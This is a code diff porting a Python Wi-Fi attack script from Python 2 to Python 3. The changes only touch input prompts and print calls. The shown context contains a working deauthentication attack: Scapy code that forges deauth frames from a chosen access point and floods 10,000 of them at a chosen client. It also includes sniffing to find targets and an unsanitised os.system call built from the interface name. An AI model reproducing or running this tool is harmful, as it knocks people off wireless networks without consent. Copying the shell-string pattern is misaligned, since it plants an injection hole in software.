@@ -27,7 +27,7 @@ def MonitorMode(interface):
 	'''
 	MonitorMode function - Runs the bash script to quickly setup monitor mode on selected interface.
 	'''
-	choise = raw_input("Put "+interface+" in monitor mode? Y/n (leave blank for Y):")
+	choise = input("Put "+interface+" in monitor mode? Y/n (leave blank for Y):")
 	if(choise == "y" or choise == "Y" or choise == ""):
 		os.system("bash start-monitor.sh "+interface)
 		print(interface+" mode changed to Monitor\n")
@@ -38,7 +38,7 @@ def DeauthAttack(interface, device_target, client_target):
 	'''
 	DeauthAttack function - Start the deauth attack by given interface, AP mac address and client MAC address.
 	'''
-	print 'Deauthing',client_target,'from',device_target,'...'
+	print('Deauthing',client_target,'from',device_target,'...')
 	pkt = RadioTap() / Dot11( addr1 = client_target, addr2 = device_target, addr3 = device_target, type=0, subtype= 12) / Dot11Deauth()
 	sendp(pkt, iface = interface, count = 10000, inter = .2)
 
@@ -47,8 +47,8 @@ def Display_Devices_Clients():
 	Display_Device_Clients function - Each time a new AP or client s detected, it will update and display it onto the console. It allows human readable mapping of SSIDs and MACs.
 	'''
 	os.system("clear")
-	print devices
-	print clients
+	print(devices)
+	print(clients)
 	print ("-------- Devices Table --------\n")
 	print ("---- ESSID -------- MAC Address ----\n")
 	count = 1
@@ -110,7 +110,7 @@ def Device_Interface():
 	'''
 	Device_Interface function - Choose an interface that is currently on monitor mode.
 	'''
-	choise  = raw_input("\nSelect an interface to work with (leave blank for wlan0):")
+	choise  = input("\nSelect an interface to work with (leave blank for wlan0):")
 	if(choise == ""):
 		return "wlan0"
 	else:
@@ -131,7 +131,7 @@ def Interface():
 		interface = Device_Interface()
 		MonitorMode(interface)
 
-		choise = raw_input("Start to scan? Y/n (leave blank for Y):")
+		choise = input("Start to scan? Y/n (leave blank for Y):")
 		if(choise == "y" or choise == "Y" or choise == ""):
 			print("Starting check for Devices and Clients\n")
 			sniff(iface = interface, prn = PacketHandler)
@@ -139,7 +139,7 @@ def Interface():
 		if(devices and clients):
 			Display_Devices()
 			while(1):
-				device_target = raw_input("\nPlease choose Device MAC Address (For example: 00:18:25:16:72:b0):")	
+				device_target = input("\nPlease choose Device MAC Address (For example: 00:18:25:16:72:b0):")	
 				if(device_target == "exit" or choise == "quit"):
 					Exit()
 				if(device_target not in devices.keys()):
